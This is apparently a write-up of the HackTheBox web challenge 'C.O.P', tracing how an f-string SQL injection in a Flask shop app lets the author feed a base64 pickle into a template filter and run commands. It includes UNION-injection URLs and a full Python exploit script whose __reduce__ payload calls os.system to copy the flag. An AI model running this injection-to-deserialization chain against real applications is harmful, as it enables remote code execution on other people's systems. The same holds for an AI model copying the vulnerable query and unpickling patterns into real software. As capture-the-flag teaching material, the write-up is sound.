---
title: "C.O.P Writeup"
date: 2023-05-05T14:39:19-04:00
draft: false
images:
tags:
  - hackthebox
  - linux
  - hacking
---

## Difficulty: Easy

After going to the challenge, we are presented with the following:

![Untitled](../../img/cop.png)

Looking at the source code for the web app, there is the following code in `app.py` which defines the `pickle` template filter:

```python
@app.template_filter('pickle')
def pickle_loads(s):
	return pickle.loads(base64.b64decode(s))
```

It takes the value on which the template filter is applied on, and decodes it as base64, then deserializes it as an object using Pickle, a built-in module in Python for serializing and deserializing objects. 

The pickle template filter is applied on values in both `index.html` and `item.html`. 

Here is an example in `item.html`:

```html
<div class="container px-4 px-lg-5 my-5">
    <div class="row gx-4 gx-lg-5 align-items-center">
        {% set item = product | pickle %}
        <div class="col-md-6"><img class="card-img-top mb-5 mb-md-0" src="{{ item.image }}" alt="..." /></div>
        <div class="col-md-6">
            <h1 class="display-5 fw-bolder">{{ item.name }}</h1>
            <div class="fs-5 mb-5">
                <span>£{{ item.price }}</span>
            </div>
            <p class="lead">{{ item.description }}</p>
        </div>
    </div>
</div>
```

The danger with the pickle module in Python is that you should never pickle data you do not trust. If we can control what the app pickles, then we could potentially perform Remote Code Execution. 

This warning is given in the [official documentation for Pickle](https://docs.python.org/3/library/pickle.html):

![Untitled](../../img/cop1.png)

Currently, there does not seem to be an obvious way to control the values of which are passed through the pickle template filter. 

Looking further into the code, we find the following interesting code in `models.py`:

```python
from application.database import query_db

class shop(object):

    @staticmethod
    def select_by_id(product_id):
        return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)

    @staticmethod
    def all_products():
        return query_db('SELECT * FROM products')
```

The following line is clearly vulnerable to SQL injection:

```python
return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)
```

The question is, where is `product_id` received from? 

Looking at the code in `[routes.py](http://routes.py)` we can see the following route:

```python
@web.route('/view/<product_id>')
def product_details(product_id):
    return render_template('item.html', product=shop.select_by_id(product_id))
```

So navigating to `/view/<product_id>` for example, will pass the product ID in the URL into `shop.select_by_id` which will pass the ID into the following vulnerable function:

```python
@staticmethod
def select_by_id(product_id):
    return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)
```

So clearly, to perform an SQL injection, we need to inject our malicious SQL into the `product_id` URL parameter. 

If we are able to perform an SQL injection, this could tie back to the Remote Code Execution with Pickle previously mentioned. If we are able to run arbitrary SQL queries, we could change the base64 encoded serialized objects in the `products` table to contain a base64 encoded serialized object of our own, thus having the ability to perform Remote Code Execution on the machine when the object is deserialized. 

After trying the following on a local instance I was running, in order to test for SQL injection: 

```plaintext
http://localhost:1337/view/1'; SELECT * FROM products; --
```

I get the following error:

```plaintext
sqlite3.Warning: You can only execute one statement at a time.
```

This means that we are unable to run stacked queries, which is just a way of ordering SQL queries to run one after another by separating them with a semi-colon. This means we will not be able to write to the database. 

It is important to note that you will only receive an error by sqlite3 if the query being ran contains a semi-colon, which indicates stacked queries. 

An SQL injection we could perform without the use of a semi-colon is the following:

```plaintext
http://localhost:1337/view/' UNION SELECT "helloworld" --
```

The query internally being ran is:

```sql
SELECT data FROM products WHERE id='' UNION SELECT "helloworld" --'
```

Which will simply output: `helloworld`. Referring back to the code of the web app, this would mean that the output of the `shop.select_by_id` function in:

```python
@web.route('/view/<product_id>')
def product_details(product_id):
    return render_template('item.html', product=shop.select_by_id(product_id))
```

would be `helloworld`. This would then be pipped into the `product` variable in Jinja2 (template engine for Flask) which will be used in the `item.html`. Inside of `item.html` we see the following line:

```plaintext
{% set item = product | pickle %}
```

The product variable in Jinja2 is being passed through the pickle template filter we defined, then it’s output is set to some variable named `item`. 

This means that `helloworld` would end up being passed through the pickle template filter we defined, which was (reminder):

```python
@app.template_filter('pickle')
def pickle_loads(s):
	return pickle.loads(base64.b64decode(s))
```

This means `helloworld` is decoded as base64, and pickle attempts to deserialize it as a serialized object. The text `helloworld` is obviously not valid base64, so we still get an error when trying our SQL injection above, but it’s different that the first one:

```plaintext
File "/usr/local/lib/python3.8/base64.py", line 87, in b64decode
    return binascii.a2b_base64(s)
binascii.Error: Incorrect padding
```

This confirms that the app attempt to decode `helloworld` as base64, and deserialize it as a serialized object!

 If we create a malicious object, serialize it using pickle, encode it as base64, and replace `helloworld` with our malicious base64 encoded serialized object, we could potentially perform Remote Code Execution. 

So how does one create a malicious object? 

[This blog](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) covers this topic very well, I highly recommend it! I will also be briefly explaining it. 

Pretty much, let’s say we define a class named `Person`. Classes obviously can contain methods. In Python, there are multiple *Special Methods*. For example: `__init__()`, `__repr__()`, `__eq__()`, etc. 

One of those *Special Methods* is the `__reduce__()` method. 

Let’s say that we define `Person` in the following way:

```python
class Person:
	def __reduce__(self):
		# . . .
```

And let’s also say that we create an instance of `Person` and serialize it using Pickle. Once our serialized object is deserialized, the `__reduce__()` method will be called. It is required for `__reduce__()` to return a tuple, where the first element is any callable function in Python, and the rest of the elements of the tuple are arguments to pass into the callable function at the start of the tuple (if any). When the `__reduce__()` method is called on deserialization, the tuple returned will be used to construct another function to execute with the according arguments found in the tuple.  

With this information, we can create a malicious class with a `__reduce__()` which returns a tuple that will be used to construct a function that when called, will run some operating system command. 

Here is what I made:

```python
class EvilObject:
    def __reduce__(self):
        return (os.system, ('cp flag.txt application/static',))
```

On deserialization, the operating system command `cp flag.txt application/static` will be executed, copying the flag file into in the `/static` folder, which makes it accessible to us in the app by simply indexing it. 

To make the process of serializing the object, encoding it in base64 and throwing into an SQL injection easier, I wrote this simple Python script:

```python
from requests import get
import pickle
import os
from base64 import b64encode

class EvilObject:
    def __reduce__(self):
        return (os.system, ('cp flag.txt application/static',))
    
evil_instance = EvilObject()
    
MALICIOUS_SERIALIZED_OBJ = b64encode(pickle.dumps(evil_instance)).decode('utf-8')

URL = f"http://challenge-address:port/view/' UNION SELECT '{MALICIOUS_SERIALIZED_OBJ}' --"

res = get(URL)
print(res.status_code, res.reason)
print(res.content.decode('utf-8'))
```

After running the script, I navigate to `/static/flag.txt` and boom, I got the flag!

![Untitled](../../img/cop2.png)

Note: [This part](https://docs.python.org/3/library/pickle.html#object.__reduce__) of the official documentation for Pickle covers more details about `__reduce__()`.

